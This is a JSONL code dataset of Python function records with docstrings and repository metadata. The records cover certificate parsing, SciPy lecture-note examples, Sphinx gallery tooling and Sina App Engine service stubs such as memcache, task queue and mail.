{"docstring": "#https://www.mozilla.org/projects/security/pki/nss/tech-notes/tn3.html\n", "func_signal": "def __init__(self, asn1_netscapeCertType):\n", "code": "bits = asn1_netscapeCertType._value\nself.clientCert = len(bits) > 0 and bool(bits[0])\nself.serverCert = len(bits) > 1 and bool(bits[1])\nself.caCert = len(bits) > 5 and bool(bits[5])", "path": "pyx509\\pkcs7_models.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "\"\"\"check if the time interval of validity of the certificate contains\n'date' provided as argument\"\"\"\n", "func_signal": "def time_validity_at_date(self, date):\n", "code": "from_date = self.tbsCertificate.validity.get_valid_from_as_datetime()\nto_date = self.tbsCertificate.validity.get_valid_to_as_datetime()\ntime_ok = to_date >= date >= from_date\nreturn time_ok", "path": "pyx509\\pkcs7_models.py", "repo_name": "nimia/public_drown_scanner", "stars": 441, "license": "gpl-2.0", "language": "python", "size": 111}
{"docstring": "''' Returns the energy production [Wh] for the given release [m3/s]\n'''\n", "func_signal": "def energy_production(self, release):\n", "code": "power = 1000 * 9.81 * self.head * release * self.efficiency \nreturn power * 3600", "path": "packages\\traits\\reservoir_with_irrigation_listener.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "# Test that non '.py' files are not filtered.\n", "func_signal": "def test_filter_and_sort():\n", "code": "file_list = ['a', 'aaa', 'aa', '', 'z', 'zzzzz']\nfile_list2 = dir_sort.filter_and_sort(file_list)\nassert len(file_list2) == 0\n\n# Test that the otuput file list is ordered by length.\nfile_list = [ n + '.py' for n in file_list]\nfile_list2 = dir_sort.filter_and_sort(file_list)\nname1 = file_list2.pop(0)\nfor name in file_list2:\n    assert len(name1) <= len(name)", "path": "intro\\solutions\\test_dir_sort.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\"Parse a Sphinx search index\n\nParameters\n----------\nsearchindex : str\n    The Sphinx search index (contents of searchindex.js)\n\nReturns\n-------\nfilenames : list of str\n    The file names parsed from the search index.\nobjects : dict\n    The objects parsed from the search index.\n\"\"\"\n", "func_signal": "def parse_sphinx_searchindex(searchindex):\n", "code": "def _select_block(str_in, start_tag, end_tag):\n    \"\"\"Select first block delimited by start_tag and end_tag\"\"\"\n    start_pos = str_in.find(start_tag)\n    if start_pos < 0:\n        raise ValueError('start_tag not found')\n    depth = 0\n    for pos in range(start_pos, len(str_in)):\n        if str_in[pos] == start_tag:\n            depth += 1\n        elif str_in[pos] == end_tag:\n            depth -= 1\n\n        if depth == 0:\n            break\n    sel = str_in[start_pos + 1:pos]\n    return sel\n\ndef _parse_dict_recursive(dict_str):\n    \"\"\"Parse a dictionary from the search index\"\"\"\n    dict_out = dict()\n    pos_last = 0\n    pos = dict_str.find(':')\n    while pos >= 0:\n        key = dict_str[pos_last:pos]\n        if dict_str[pos + 1] == '[':\n            # value is a list\n            pos_tmp = dict_str.find(']', pos + 1)\n            if pos_tmp < 0:\n                raise RuntimeError('error when parsing dict')\n            value = dict_str[pos + 2: pos_tmp].split(',')\n            # try to convert elements to int\n            for i in range(len(value)):\n                try:\n                    value[i] = int(value[i])\n                except ValueError:\n                    pass\n        elif dict_str[pos + 1] == '{':\n            # value is another dictionary\n            subdict_str = _select_block(dict_str[pos:], '{', '}')\n            value = _parse_dict_recursive(subdict_str)\n            pos_tmp = pos + len(subdict_str)\n        else:\n            raise ValueError('error when parsing dict: unknown elem')\n\n        key = key.strip('\"')\n        if len(key) > 0:\n            dict_out[key] = value\n\n        pos_last = dict_str.find(',', pos_tmp)\n        if pos_last < 0:\n            break\n        pos_last += 1\n        pos = dict_str.find(':', pos_last)\n\n    return dict_out\n\n# parse objects\nquery = 'objects:'\npos = searchindex.find(query)\nif pos < 0:\n    raise ValueError('\"objects:\" not found in search index')\n\nsel = _select_block(searchindex[pos:], '{', '}')\nobjects = _parse_dict_recursive(sel)\n\n# parse filenames\nquery = 'filenames:'\npos = searchindex.find(query)\nif pos < 0:\n    raise ValueError('\"filenames:\" not found in search index')\nfilenames = searchindex[pos + len(query) + 1:]\nfilenames = filenames[:filenames.find(']')]\nfilenames = [f.strip('\"') for f in filenames.split(',')]\n\nreturn filenames, objects", "path": "sphinxext\\gen_rst.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\"\nCall a Fortran routine, and preserve input shape\n\"\"\"\n", "func_signal": "def some_function(input):\n", "code": "input = np.asarray(input)\n# fortran_module.some_function() only accepts 1-D arrays!\noutput = fortran_module.some_function(input.ravel())\nreturn output.reshape(input.shape)", "path": "intro\\numpy\\solutions\\2_a_call_fortran.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "# Extract the line count of a file\n", "func_signal": "def extract_line_count(filename, target_dir):\n", "code": "example_file = os.path.join(target_dir, filename)\nlines = file(example_file).readlines()\nstart_row = 0\nif lines and lines[0].startswith('#!'):\n    lines.pop(0)\n    start_row = 1\ntokens = tokenize.generate_tokens(lines.__iter__().next)\ncheck_docstring = True\nerow_docstring = 0\nfor tok_type, _, _, (erow, _), _ in tokens:\n    tok_type = token.tok_name[tok_type]\n    if tok_type in ('NEWLINE', 'COMMENT', 'NL', 'INDENT', 'DEDENT'):\n        continue\n    elif ((tok_type == 'STRING') and check_docstring):\n        erow_docstring = erow\n        check_docstring = False\nreturn erow_docstring+1+start_row, erow+1+start_row", "path": "sphinxext\\gen_rst.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\"\nDisplay the coil in the 3D view.\nIf half is True, display only one half of the coil.\n\"\"\"\n", "func_signal": "def display(self, half=False):\n", "code": "n, l, m = self.base_vectors()\ntheta = np.linspace(0, (2-half)*np.pi, 30)\ntheta = theta[..., np.newaxis]\ncoil = self.radius*(np.sin(theta)*l + np.cos(theta)*m)\ncoil += self.position\ncoil_x, coil_y, coil_z = coil.T\nif self.plot is None:\n    self.plot = self.app.scene.mlab.plot3d(coil_x, coil_y, coil_z, \n                            tube_radius=0.007, color=(0, 0, 1),\n                            name=self.name )\nelse:\n    self.plot.mlab_source.set(x=coil_x, y=coil_y, z=coil_z)", "path": "packages\\3d_plotting\\examples\\coil_application.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\" Extract a module-level docstring, if any\n\"\"\"\n", "func_signal": "def extract_docstring(filename, ignore_heading=False):\n", "code": "lines = file(filename).readlines()\nstart_row = 0\nif lines[0].startswith('#!'):\n    lines.pop(0)\n    start_row = 1\ndocstring = ''\nfirst_par = ''\ntokens = tokenize.generate_tokens(iter(lines).next)\nfor tok_type, tok_content, _, (erow, _), _ in tokens:\n    tok_type = token.tok_name[tok_type]\n    if tok_type in ('NEWLINE', 'COMMENT', 'NL', 'INDENT', 'DEDENT'):\n        continue\n    elif tok_type == 'STRING':\n        docstring = eval(tok_content)\n        # If the docstring is formatted with several paragraphs, extract\n        # the first one:\n        paragraphs = '\\n'.join(\n            line.rstrip() for line\n            in docstring.split('\\n')).split('\\n\\n')\n        if paragraphs:\n            if ignore_heading:\n                if len(paragraphs) > 1:\n                    first_par = re.sub('\\n', ' ', paragraphs[1])\n                    first_par = ((first_par[:95] + '...')\n                                 if len(first_par) > 95 else first_par)\n                else:\n                    raise ValueError(\"Docstring not found by gallery\",\n                                     \"Please check your example's layout\",\n                                     \" and make sure it's correct\")\n            else:\n                first_par = paragraphs[0]\n\n    break\nreturn docstring, first_par, erow + 1 + start_row", "path": "sphinxext\\gen_rst.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\" Find roots for all the functions, and upper and lower bounds\n    given and return the total number of function calls.\n\"\"\"\n", "func_signal": "def bench_optimizer(optimizer, param_grid):\n", "code": "return sum(apply_optimizer(optimizer, func, a, b)\n           for func, a, b in param_grid)", "path": "advanced\\debugging\\to_debug.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\"Deflationary FastICA using fun approx to neg-entropy function\n\nUsed internally by FastICA.\n\"\"\"\n\n", "func_signal": "def _ica_def(X, tol, g, gprime, fun_args, maxit, w_init):\n", "code": "n_comp = w_init.shape[0]\nW = np.zeros((n_comp, n_comp), dtype=float)\n\n# j is the index of the extracted component\nfor j in range(n_comp):\n    w = w_init[j, :].copy()\n    w /= np.sqrt((w**2).sum())\n\n    n_iterations = 0\n    # we set lim to tol+1 to be sure to enter at least once in next while\n    lim = tol + 1 \n    while ((lim > tol) & (n_iterations < (maxit-1))):\n        wtx = np.dot(w.T, X)\n        gwtx = g(wtx, fun_args)\n        g_wtx = gprime(wtx, fun_args)\n        w1 = (X * gwtx).mean(axis=1) - g_wtx.mean() * w\n        \n        _gs_decorrelation(w1, W, j)\n        \n        w1 /= np.sqrt((w1**2).sum())\n\n        lim = np.abs(np.abs((w1 * w).sum()) - 1)\n        w = w1\n        n_iterations = n_iterations + 1\n        \n    W[j, :] = w\n\nreturn W", "path": "advanced\\optimizing\\ica.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\"Helper function to get data over http or from a local file\"\"\"\n", "func_signal": "def _get_data(url):\n", "code": "if url.startswith('http://'):\n    resp = urllib2.urlopen(url)\n    encoding = resp.headers.dict.get('content-encoding', 'plain')\n    data = resp.read()\n    if encoding == 'plain':\n        pass\n    elif encoding == 'gzip':\n        data = StringIO(data)\n        data = gzip.GzipFile(fileobj=data).read()\n    else:\n        raise RuntimeError('unknown encoding')\nelse:\n    with open(url, 'r') as fid:\n        data = fid.read()\n    fid.close()\n\nreturn data", "path": "sphinxext\\gen_rst.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "# A grid of c-values\n", "func_signal": "def compute_mandelbrot(N_max, some_threshold, nx, ny):\n", "code": "x = np.linspace(-2, 1, nx)\ny = np.linspace(-1.5, 1.5, ny)\n\nc = x[:,newaxis] + 1j*y[newaxis,:]\n\n# Mandelbrot iteration\n\nz = c\nfor j in xrange(N_max):\n    z = z**2 + c\n\nmandelbrot_set = (abs(z) < some_threshold)\n\nreturn mandelbrot_set", "path": "intro\\numpy\\solutions\\2_4_mandelbrot.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "# Sort the list of examples by line-count\n", "func_signal": "def line_count_sort(file_list, target_dir):\n", "code": "new_list = filter(lambda x: x.endswith('.py'), file_list)\nunsorted = np.zeros(shape=(len(new_list), 2))\nunsorted = unsorted.astype(np.object)\nfor count, exmpl in enumerate(new_list):\n    docstr_lines, total_lines = extract_line_count(exmpl, target_dir)\n    unsorted[count][1] = total_lines - docstr_lines\n    unsorted[count][0] = exmpl\nindex = np.lexsort((unsorted[:, 0].astype(np.str),\n                    unsorted[:, 1].astype(np.float)))\nif not len(unsorted):\n    return []\nreturn np.array(unsorted[index][:, 0]).tolist()", "path": "sphinxext\\gen_rst.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\" Returns 3 orthognal base vectors, the first one colinear to\n    the axis of the loop.\n\"\"\"\n# normalize n\n", "func_signal": "def base_vectors(self):\n", "code": "n = self.direction / (self.direction**2).sum(axis=-1)\n\n# choose two vectors perpendicular to n \n# choice is arbitrary since the coil is symetric about n\nif  np.abs(n[0])==1 :\n    l = np.r_[n[2], 0, -n[0]]\nelse:\n    l = np.r_[0, n[2], -n[1]]\n\nl /= (l**2).sum(axis=-1)\nm = np.cross(n, l)\nreturn n, l, m", "path": "packages\\3d_plotting\\examples\\coil_application.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\"\nreturns the magnetic field for the current loop calculated \nfrom eqns (1) and (2) in Phys Rev A Vol. 35, N 4, pp. 1535-1546; 1987. \n\nreturn: \n    B is a vector for the B field at point r in inverse units of \n(mu I) / (2 pi d) \nfor I in amps and d in meters and mu = 4 pi * 10^-7 we get Tesla \n\"\"\"\n### Translate the coordinates in the coil's frame\n", "func_signal": "def mk_B_field(self):\n", "code": "n, l, m = self.base_vectors()\nR       = self.radius\nr0      = self.position\nr       = np.c_[np.ravel(self.app.X), np.ravel(self.app.Y),\n                                        np.ravel(self.app.Z)]\n\n# transformation matrix coil frame to lab frame\ntrans = np.vstack((l, m, n))\n\nr -= r0\t  #point location from center of coil\nr = np.dot(r, linalg.inv(trans) ) \t    #transform vector to coil frame \n\n#### calculate field\n\n# express the coordinates in polar form\nx = r[:, 0]\ny = r[:, 1]\nz = r[:, 2]\nrho = np.sqrt(x**2 + y**2)\ntheta = np.arctan(x/y)\n\nE = special.ellipe((4 * R * rho)/( (R + rho)**2 + z**2))\nK = special.ellipk((4 * R * rho)/( (R + rho)**2 + z**2))\nBz =  1/np.sqrt((R + rho)**2 + z**2) * ( \n            K \n          + E * (R**2 - rho**2 - z**2)/((R - rho)**2 + z**2) \n        )\nBrho = z/(rho*np.sqrt((R + rho)**2 + z**2)) * ( \n        -K \n        + E * (R**2 + rho**2 + z**2)/((R - rho)**2 + z**2) \n        )\n# On the axis of the coil we get a divided by zero here. This returns a\n# NaN, where the field is actually zero :\nBrho[np.isnan(Brho)] = 0\n\nB = np.c_[np.cos(theta)*Brho, np.sin(theta)*Brho, Bz ]\n\n# Rotate the field back in the lab's frame\nB = np.dot(B, trans)\n\nBx, By, Bz = B.T\nBx = np.reshape(Bx, self.app.X.shape)\nBy = np.reshape(By, self.app.X.shape)\nBz = np.reshape(Bz, self.app.X.shape)\n\nBnorm = np.sqrt(Bx**2 + By**2 + Bz**2)\n\n# We need to threshold ourselves, rather than with VTK, to be able \n# to use an ImageData\nBmax = 10 * np.median(Bnorm)\n\nBx[Bnorm > Bmax] = np.NAN \nBy[Bnorm > Bmax] = np.NAN\nBz[Bnorm > Bmax] = np.NAN\nBnorm[Bnorm > Bmax] = np.NAN\n\nself.Bx = Bx\nself.By = By\nself.Bz = Bz\nself.Bnorm = Bnorm", "path": "packages\\3d_plotting\\examples\\coil_application.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\" Gram-Schmidt-like decorrelation. \"\"\"\n", "func_signal": "def _gs_decorrelation(w, W, j):\n", "code": "t = np.zeros_like(w)\nfor u in range(j):\n    t = t + np.dot(w, W[u]) * W[u]\n    w -= t\nreturn w", "path": "advanced\\optimizing\\ica.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\"Make a thumbnail with the same aspect ratio centered in an\n   image with a given width and height\n\"\"\"\n", "func_signal": "def make_thumbnail(in_fname, out_fname, width, height):\n", "code": "img = Image.open(in_fname)\nwidth_in, height_in = img.size\nscale_w = width / float(width_in)\nscale_h = height / float(height_in)\n\nif height_in * scale_w <= height:\n    scale = scale_w\nelse:\n    scale = scale_h\n\nwidth_sc = int(round(scale * width_in))\nheight_sc = int(round(scale * height_in))\n\n# resize the image\nimg.thumbnail((width_sc, height_sc), Image.ANTIALIAS)\n\n# insert centered\nthumb = Image.new('RGB', (width, height), (255, 255, 255))\npos_insert = ((width - width_sc) / 2, (height - height_sc) / 2)\nthumb.paste(img, pos_insert)\n\nthumb.save(out_fname)\n# Use optipng to perform lossless compression on the resized image if\n# software is installed\nif os.environ.get('SKLEARN_DOC_OPTIPNG', False):\n    try:\n        subprocess.call([\"optipng\", \"-quiet\", \"-o\", \"9\", out_fname])\n    except Exception:\n        warnings.warn('Install optipng to reduce the size of the generated images')", "path": "sphinxext\\gen_rst.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\"Resolve the link to the documentation, returns None if not found\n\nParameters\n----------\ncobj : dict\n    Dict with information about the \"code object\" for which we are\n    resolving a link.\n    cobi['name'] : function or class name (str)\n    cobj['module_short'] : shortened module name (str)\n    cobj['module'] : module name (str)\nthis_url: str\n    URL of the current page. Needed to construct relative URLs\n    (only used if relative=True in constructor).\n\nReturns\n-------\nlink : str | None\n    The link (URL) to the documentation.\n\"\"\"\n", "func_signal": "def resolve(self, cobj, this_url):\n", "code": "full_name = cobj['module_short'] + '.' + cobj['name']\nlink = self._link_cache.get(full_name, None)\nif link is None:\n    # we don't have it cached\n    link = self._get_link(cobj)\n    # cache it for the future\n    self._link_cache[full_name] = link\n\nif link is False or link is None:\n    # failed to resolve\n    return None\n\nif self.relative:\n    link = os.path.relpath(link, start=this_url)\n    if self._is_windows:\n        # replace '\\' with '/' so it on the web\n        link = link.replace('\\\\', '/')\n\n    # for some reason, the relative link goes one directory too high up\n    link = link[3:]\n\nreturn link", "path": "sphinxext\\gen_rst.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\"Get a valid link, False if not found\"\"\"\n\n", "func_signal": "def _get_link(self, cobj):\n", "code": "fname_idx = None\nfull_name = cobj['module_short'] + '.' + cobj['name']\nif full_name in self._searchindex['objects']:\n    value = self._searchindex['objects'][full_name]\n    if isinstance(value, dict):\n        value = value[value.keys()[0]]\n    fname_idx = value[0]\nelif cobj['module_short'] in self._searchindex['objects']:\n    value = self._searchindex['objects'][cobj['module_short']]\n    if cobj['name'] in value.keys():\n        fname_idx = value[cobj['name']][0]\n\nif fname_idx is not None:\n    fname = self._searchindex['filenames'][fname_idx] + '.html'\n\n    if self._is_windows:\n        fname = fname.replace('/', '\\\\')\n        link = os.path.join(self.doc_url, fname)\n    else:\n        link = posixpath.join(self.doc_url, fname)\n\n    if link in self._page_cache:\n        html = self._page_cache[link]\n    else:\n        html = get_data(link)\n        self._page_cache[link] = html\n\n    # test if cobj appears in page\n    comb_names = [cobj['module_short'] + '.' + cobj['name']]\n    if self.extra_modules_test is not None:\n        for mod in self.extra_modules_test:\n            comb_names.append(mod + '.' + cobj['name'])\n    url = False\n    for comb_name in comb_names:\n        if html.find(comb_name) >= 0:\n            url = link + '#' + comb_name\n    link = url\nelse:\n    link = False\n\nreturn link", "path": "sphinxext\\gen_rst.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\" Get the shortest possible module name \"\"\"\n", "func_signal": "def get_short_module_name(module_name, obj_name):\n", "code": "parts = module_name.split('.')\nshort_name = module_name\nfor i in range(len(parts) - 1, 0, -1):\n    short_name = '.'.join(parts[:i])\n    try:\n        exec('from %s import %s' % (short_name, obj_name))\n    except ImportError:\n        # get the last working module name\n        short_name = '.'.join(parts[:(i + 1)])\n        break\nreturn short_name", "path": "sphinxext\\gen_rst.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "\"\"\" Generate the list of examples, as well as the contents of\n    examples.\n\"\"\"\n", "func_signal": "def generate_all_example_rst(app):\n", "code": "input_dir = os.path.abspath(app.builder.srcdir)\ntry:\n    plot_gallery = eval(app.builder.config.plot_gallery)\nexcept TypeError:\n    plot_gallery = bool(app.builder.config.plot_gallery)\n# Walk all our source tree to find examples and generate them\nfor dir_path, dir_names, file_names in os.walk(input_dir):\n    if ('build' in dir_path.split(os.sep)\n                or 'auto_examples' in dir_path.split(os.sep)):\n        continue\n    if 'examples' in dir_names:\n        generate_example_rst(\n                        os.path.join(dir_path, 'examples'),\n                        os.path.join(dir_path, 'auto_examples'),\n                        plot_gallery=plot_gallery)", "path": "sphinxext\\gen_rst.py", "repo_name": "jayleicn/scipy-lecture-notes-zh-CN", "stars": 404, "license": "other", "language": "python", "size": 8540}
{"docstring": "'''Deletes a key from the memcache.\n\n@return: Nonzero on success.\n'''\n", "func_signal": "def delete(self, key):\n", "code": "if key not in _cache:\n    return False\ndel _cache[key]\nreturn True", "path": "dev_server\\sae\\memcache.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "\"\"\"Add task to the task queue\n\nArgs:\n  task: The task to be added, it can be a single Task, or a list of \n    Tasks.\n\"\"\"\n", "func_signal": "def add(self, task):\n", "code": "try:\n    tasks = list(iter(task))\nexcept TypeError:\n    tasks = [task]\n\ntask_args = {}\ntask_args['name'] = self.name\ntask_args['queue'] = []\nfor t in tasks:\n    task_args['queue'].append(t.extract_params())\n\n#print task_args\nargs = [('taskqueue', json.dumps(task_args))]\n\nreturn self._remote_call(args)", "path": "dev_server\\sae\\taskqueue.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "\"\"\"Checks sanity of key.  Fails if:\n    Key length is > SERVER_MAX_KEY_LENGTH (Raises MemcachedKeyLength).\n    Contains control characters  (Raises MemcachedKeyCharacterError).\n    Is not a string (Raises MemcachedStringEncodingError)\n    Is an unicode string (Raises MemcachedStringEncodingError)\n    Is not a string (Raises MemcachedKeyError)\n    Is None (Raises MemcachedKeyError)\n\"\"\"\n", "func_signal": "def check_key(self, key, key_extra_len=0):\n", "code": "if isinstance(key, tuple): key = key[1]\nif not key:\n    raise Client.MemcachedKeyNoneError(\"Key is None\")\nif isinstance(key, unicode):\n    raise Client.MemcachedStringEncodingError(\n            \"Keys must be str()'s, not unicode.  Convert your unicode \"\n            \"strings using mystring.encode(charset)!\")\nif not isinstance(key, str):\n    raise Client.MemcachedKeyTypeError(\"Key must be str()'s\")\n\nif isinstance(key, basestring):\n    if self.server_max_key_length != 0 and \\\n        len(key) + key_extra_len > self.server_max_key_length:\n        raise Client.MemcachedKeyLengthError(\"Key length is > %s\"\n                 % self.server_max_key_length)\n    for char in key:\n        if ord(char) < 33 or ord(char) == 127:\n            raise Client.MemcachedKeyCharacterError(\n                    \"Control characters not allowed\")", "path": "dev_server\\sae\\kvdb.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "\"\"\"Fetches the given method's response returning from RenRen API.\n\nSend a POST request to the given method with the given params.\n\"\"\"\n", "func_signal": "def request(self, params = None):\n", "code": "params[\"api_key\"] = self.api_key\nparams[\"call_id\"] = str(int(time.time() * 1000))\nparams[\"format\"] = \"json\"\nparams[\"session_key\"] = self.session_key\nparams[\"v\"] = '1.0'\nsig = self.hash_params(params);\nparams[\"sig\"] = sig\n\npost_data = None if params is None else urllib.urlencode(params)\n\n#logging.info(\"request params are: \" + str(post_data))\n\nfile = urllib.urlopen(RENREN_API_SERVER, post_data)\n\ntry:\n    s = file.read()\n    logging.info(\"api response is: \" + s)\n    response = _parse_json(s)\nfinally:\n    file.close()\nif type(response) is not list and response[\"error_code\"]:\n    logging.info(response[\"error_msg\"])\n    raise RenRenAPIError(response[\"error_code\"], response[\"error_msg\"])\nreturn response", "path": "examples\\renren\\renrenoauth.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "\"\"\"Returns the logged in renren user, or None if unconnected.\"\"\"\n", "func_signal": "def current_user(self):\n", "code": "if not hasattr(self, \"_current_user\"):\n    self._current_user = None\n    user_id = parse_cookie(self.get_secure_cookie(\"renren_user\"))\n    if user_id:\n        logging.info(\"renren_user in cookie is: %s\", user_id)\n        self._current_user = User.get(user_id)\nreturn self._current_user", "path": "examples\\renren\\renrenoauth.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "\"\"\"Sends the email message.\n\nThis method just post the message to the mail delivery queue.\n\"\"\"\n", "func_signal": "def send(self):\n", "code": "message = self._to_proto()\n#print message\nself._remote_call(message)", "path": "dev_server\\sae\\mail.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "\"\"\"Generates and signs a cookie for the give name/value\"\"\"\n# Now we just ignore domain, path and expires\n", "func_signal": "def set_cookie(response, name, value, domain=None, path=\"/\", expires=None):\n", "code": "response.set_secure_cookie(name, value)\nlogging.info(\"set cookie as \" + name + \", value is: \" + value)", "path": "examples\\renren\\renrenoauth.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "\"\"\"Query for how many task is left(not executed) in the queue. \"\"\"\n", "func_signal": "def size(self):\n", "code": "args = []\nargs.append(('act', 'curlen'))\nargs.append(('params', json.dumps({'name': self.name})))\nreturn int(self._remote_call(args))", "path": "dev_server\\sae\\taskqueue.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "'''\nRetrieves multiple keys from the memcache doing just one query.\n\n>>> success = mc.set(\"foo\", \"bar\")\n>>> success = mc.set(\"baz\", 42)\n>>> mc.get_multi([\"foo\", \"baz\", \"foobar\"]) == {\"foo\": \"bar\", \"baz\": 42}\n1\n\nget_mult [ and L{set_multi} ] can take str()-ables like ints / longs as keys too. Such as your db pri key fields.\nThey're rotored through str() before being passed off to memcache, with or without the use of a key_prefix.\nIn this mode, the key_prefix could be a table name, and the key itself a db primary key number.\n\nThis method is recommended over regular L{get} as it lowers the number of\ntotal packets flying around your network, reducing total latency, since\nyour app doesn't have to wait for each round-trip of L{get} before sending\nthe next one.\n\nSee also L{set_multi}.\n\n@param keys: An array of keys.\n@param key_prefix: A string to prefix each key when we communicate with memcache.\n    Facilitates pseudo-namespaces within memcache. Returned dictionary keys will not have this prefix.\n@return:  A dictionary of key/value pairs that were available. If key_prefix was provided, the keys in the retured dictionary will not have it present.\n\n'''\n", "func_signal": "def get_multi(self, keys, key_prefix=''):\n", "code": "retval = {}\nfor e in keys:\n    _key = key_prefix + str(e)\n    val = self._get('get', _key)\n    if val is not None:\n        retval[e] = val\nreturn retval", "path": "dev_server\\sae\\kvdb.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "\"\"\"Builds an output PrettyTable from the results in the given cursor.\"\"\"\n", "func_signal": "def _build_table(self, cursor):\n", "code": "if not cursor.description:\n    return None\n\ncolumn_names = [column[0] for column in cursor.description]\ntable = prettytable.PrettyTable(column_names)\nrows = cursor.fetchall()\nif not rows:\n    return table\nfor i, col in enumerate(rows[0]):\n    table.align[column_names[i]] = isinstance(col, basestring) and 'l' or 'r'\nfor row in rows: table.add_row(row)\nreturn table", "path": "dev_server\\cloudsql.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "\"\"\"Initializer.\n\nArgs:\n  url: URL where the taskqueue daemon should handle this task.\n  payload: Optinal, if provided, the taskqueue daemon will take this \n    task as a POST task and |payload| as POST data.\n  delay: Delay the execution of the task for certain second(s). Up to\n    600 seconds.\n  prior: If set to True, the task will be add to the head of the queue.\n\nRaises:\n  InvalidTaskError: if there's a unrecognized argument.\n\"\"\"\n", "func_signal": "def __init__(self, url, payload = None, **kwargs):\n", "code": "self.info = {}\nif url.startswith('http://'):\n    self.info['url'] = url\nelse:\n    self.info['url'] = urlparse.urljoin(self._default_netloc, url)\nif payload:\n    self.info['postdata'] = base64.b64encode(payload)\n        \nfor k, v in kwargs.iteritems():\n    if k == 'delay':\n        self.info['delay'] = v\n    elif k == 'prior':\n        self.info['prior'] = v\n    else:\n        raise InvalidTaskError()", "path": "dev_server\\sae\\taskqueue.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "\"\"\"A shortcut for sending mail\"\"\"\n", "func_signal": "def send_mail(to, subject, body, smtp, **kwargs):\n", "code": "kwargs['to'] = to\nkwargs['subject'] = subject\nkwargs['body'] = body\nkwargs['smtp'] = smtp\n\nEmailMessage(**kwargs).send()", "path": "dev_server\\sae\\mail.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "'''\nDelete multiple keys in the memcache doing just one query.\n\n>>> notset_keys = mc.set_multi({'key1' : 'val1', 'key2' : 'val2'})\n>>> mc.get_multi(['key1', 'key2']) == {'key1' : 'val1', 'key2' : 'val2'}\n1\n>>> mc.delete_multi(['key1', 'key2'])\n1\n>>> mc.get_multi(['key1', 'key2']) == {}\n1\n\n\nThis method is recommended over iterated regular L{delete}s as it reduces total latency, since\nyour app doesn't have to wait for each round-trip of L{delete} before sending\nthe next one.\n\n@param keys: An iterable of keys to clear\n@param time: number of seconds any subsequent set / update commands should fail. Defaults to 0 for no delay.\n@param key_prefix:  Optional string to prepend to each key when sending to memcache.\n    See docs for L{get_multi} and L{set_multi}.\n\n@return: 1 if no failure in communication with any memcacheds.\n@rtype: int\n\n'''\n", "func_signal": "def delete_multi(self, keys, time=0, key_prefix=''):\n", "code": "for key in keys:\n    _key = key_prefix + str(key)\n    try:\n        del _cache[_key]\n    except KeyError:\n        pass\n\nreturn True", "path": "dev_server\\sae\\memcache.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
